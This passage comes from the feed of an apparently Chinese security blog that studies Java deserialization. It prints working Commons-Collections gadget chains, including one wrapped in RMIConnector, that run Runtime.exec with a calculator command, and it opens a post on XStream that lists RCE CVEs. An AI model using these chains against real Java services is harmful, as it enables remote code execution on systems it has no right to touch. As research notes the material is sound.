&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另一种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.twice.RMIconnector;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc_nolazymap_RMIconnect_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">tser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">toser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(tser);</span><br><span class="line">        toser.writeObject(getObject());</span><br><span class="line">        toser.close();</span><br><span class="line"><span class="comment">//序列化内层的payload</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(tser.toByteArray());</span><br><span class="line">        System.out.println(exp);</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + exp);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector);</span><br><span class="line">        Map&lt;Object, Object&gt; outmap = TransformedMap.decorate(map, <span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outoutmap</span> <span class="operator">=</span> TransformedMap.decorate(outmap,<span class="literal">null</span>,constantTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">test</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct=test.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class,outoutmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSource链">WrapperConnectionPoolDataSource链</h2><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/gn8pc9n3hhcvwiit">C3P0链</a>参考这个文章自己记录过了但是又忘记了哈哈哈</p><p>列参考自以下师傅们的文章</p><p><a href="https://tttang.com/archive/1701/#toc_wrapperconnectionpooldatasource">https://tttang.com/archive/1701/#toc_wrapperconnectionpooldatasource</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18127214">https://www.cnblogs.com/F12-blog/p/18127214</a></p><p><a href="https://asal1n.github.io/2024/03/03/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://asal1n.github.io/2024/03/03/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://www.aiwin.fun/index.php/archives/4388/#cl-3">https://www.aiwin.fun/index.php/archives/4388/#cl-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SignedObject&quot;&gt;SignedObject&lt;/h2&gt;
&lt;p&gt;他是&lt;code&gt;java.security&lt;/code&gt;下一个用于创建真实运行时对象的类，更具体地说，&lt;code&gt;SignedObject&lt;/code&gt;包含另一个&lt;code&gt;Serializab</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Xstream反序列化</title>
    <link href="https://oceanzbz.github.io/post/6025e2f1.html"/>
    <id>https://oceanzbz.github.io/post/6025e2f1.html</id>
    <published>2024-12-30T06:12:33.000Z</published>
    <updated>2025-03-05T07:24:36.798Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p><p>Xstream具有以下优点</p><ul><li>使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</li><li>无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</li><li>性能 - XStream快速和低内存占用，适合于大对象图或系统。</li><li>干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</li><li>不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</li><li>完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</li><li>可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</li><li>安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</li><li>错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</li><li>另一种输出格式 - XStream支持其它的输出格式，如JSON。</li></ul><h2 id="漏洞条件">漏洞条件</h2><table><thead><tr><th>XStream 远程代码执行漏洞</th><th>CVE-2013-7285</th><th>XStream &lt;= 1.4.6</th></tr></thead><tbody><tr><td>XStream XXE</td><td><a href="https://x-stream.github.io/CVE-2016-3674.html">CVE-2016-3674</a></td><td><code>XStream</code><br/> &lt;= 1.4.8</td></tr><tr><td>XStream 远程代码执行漏洞</td><td>CVE-2019-10173</td><td><code>XStream</code><br/> &lt; 1.4.10</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></td><td><code>XStream</code><br/> &lt;= 1.4.13</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></td><td><code>XStream</code><br/>: &lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></td><td><code>XStream</code><br/>: &lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></td><td><code>XStream</code><br/>: &lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></td><td><code>XStream</code><br/>&lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></td><td><code>XStream</code><br/>: &lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></td><td><code>XStream</code><br/>: &lt;= 1.4.15</td></tr><tr><td>XStream 远程代码执行漏洞</td><td><a href="https://x-stream.github.io/CVE-2021-29505.html">CVE-2021-29505</a></td><td><code>XStream</code><br/>: &lt;= 1.4.16</td></tr></tbody></table><h2 id="环境依赖">环境依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.4</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="EventHandler类">EventHandler类</h2><p>EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p><p>EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String action;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">                <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> Statement.getMethod(</span><br><span class="line">                             target.getClass(), action, argTypes);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Converter转换器">Converter转换器</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>具体参考：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="简单使用">简单使用</h2><p>先定义一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> Company company;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, Company company)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.company = company;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Company <span class="title function_">getCompany</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> company;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompany</span><span class="params">(Company company)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.company = company;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Read People&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Company类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Company</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String companyName;</span><br><span class="line">   